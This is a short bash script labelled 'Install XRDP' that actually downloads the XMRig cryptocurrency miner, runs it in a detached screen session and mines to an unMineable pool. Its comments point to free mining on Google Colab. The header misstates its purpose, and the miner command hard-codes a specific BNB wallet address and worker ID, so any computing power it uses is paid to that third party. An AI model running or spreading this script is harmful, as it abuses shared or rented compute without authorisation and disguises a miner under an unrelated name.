#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o stratum+ssl://rx.unmineable.com:443 -k -a rx -u BNB:bnb136ns6lfw4zs5hg4n85vdthaad7hq5m4gtkgf23:164669241.GC --no-color --http-port=60070 
